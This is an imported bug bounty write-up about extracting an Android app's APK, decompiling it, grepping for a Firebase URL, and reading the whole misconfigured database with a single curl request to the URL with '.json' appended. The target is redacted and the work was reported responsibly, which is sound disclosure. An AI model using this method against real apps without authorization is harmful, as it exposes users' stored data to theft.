---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-17_write-up-private-bug-bounty-firebase-database-exposed-by-misconfiguration-2000-u.md
original_filename: 2022-01-17_write-up-private-bug-bounty-firebase-database-exposed-by-misconfiguration-2000-u.md
title: 'Write Up – Private Bug Bounty: Firebase Database Exposed By Misconfiguration
  – $2,000 USD'
category: documents
detected_topics:
- command-injection
- mobile-security
- supply-chain
tags:
- imported
- documents
- command-injection
- mobile-security
- supply-chain
language: en
raw_sha256: c36fab4acb92bb35f3f6f680b602261326c07070a56e61a06d66072a8c054125
text_sha256: b4f07fbdfb64c33ddd65ae2559b9af3567d166ab39dceb10a38cd74a777f4305
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# Write Up – Private Bug Bounty: Firebase Database Exposed By Misconfiguration – $2,000 USD

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-17_write-up-private-bug-bounty-firebase-database-exposed-by-misconfiguration-2000-u.md
- Source Type: markdown
- Detected Topics: command-injection, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `c36fab4acb92bb35f3f6f680b602261326c07070a56e61a06d66072a8c054125`
- Text SHA256: `b4f07fbdfb64c33ddd65ae2559b9af3567d166ab39dceb10a38cd74a777f4305`


## Content

---
title: "Write Up – Private Bug Bounty: Firebase Database Exposed By Misconfiguration – $2,000 USD"
page_title: "PRIVATE BUG BOUNTY – FIREBASE DATABASE EXPOSED BY MISCONFIGURATION – @omespino"
url: "https://omespino.com/write-up-private-bug-bounty-firebase-database-exposed-by-misconfiguration-2000-usd/"
final_url: "https://omespino.com/write-up-private-bug-bounty-firebase-database-exposed-by-misconfiguration-2000-usd/"
authors: ["Omar Espino (@omespino)"]
bugs: ["Android", "Insecure Firebase database"]
bounty: "2,000"
publication_date: "2022-01-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3001
---

MOBILE$2,000 USD[January 2022](/write-up-private-bug-bounty-firebase-database-exposed-by-misconfiguration-2000-usd/)

# PRIVATE BUG BOUNTY – FIREBASE DATABASE EXPOSED BY MISCONFIGURATION

**Introduction** Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about a private bug bounty program and why you can always check the basic payloads because you will be surprised that sometimes will work. 

**Report Summary** Hi REDACTED team, I was able to find a firebase instance URL misconfigured exposed in your REDACTED Android application.

**Proof of concept** 1.- Get the latest REDACTED Android application, in my case I downloaded it to my phone (connect the phone in debug mode) and then pull out the APK with adb tools. (com.REDACTED.android.main is the APK package name): 
  
  
  omespino@h0st:~# adb pull data/app/com.REDACTED.android.main/base.apk
  

2.- Then I decompile the APK with the following command apktool:  

  
  
  omespino@h0st:~# apktool d base.apk
  

3.- Then I justgrep for firebase and HTTP strings in the “base/AndroidManifest.xml” file.  

  
  
  # grep for firebase and HTTP strings and got some URLs including the firebaseio.com one
  omespino@h0st:~# grep -ir firebase | grep http 
  - redacted - 
  ...
  ...
  "https://API-REDACTED-XXXXXXXXXXXX.firebaseio.com/"
  ...
  ...
  - redacted -

4.- Simple POC to see the firebase misconfiguration (just append.json to the URL):  

  
  
  omespino@h0st:~# curl -X GET -H "REDACTED-Security: @omespino" https://API-REDACTED-XXXXXXXXXXXX.firebaseio.com/.json
  

5.- See the full firebase database exposed because is misconfigured with bad permissions. PD. I made the request and the stopped after testing that was vulnerable.

**Environment and tools** \- adb Android Debug Bridge version 1.0.39  
\- apktool 2.3.3

**Impact** Since the full firebase database instance is misconfigured, anyone can pull the whole database.  
Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter [@omespino](https://twitter.com/omespino), read you later.[](https://www.facebook.com/sharer/sharer.php?u=/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/&display=popup&ref=plugin&src=share_button)

[](/write-up-private-bug-bounty-rce-in-ec2-instance-via-ssh-with-private-key-exposed-on-public-github-repository-xx000-usd/)

[](/bug-bounty-writeups-collection/)
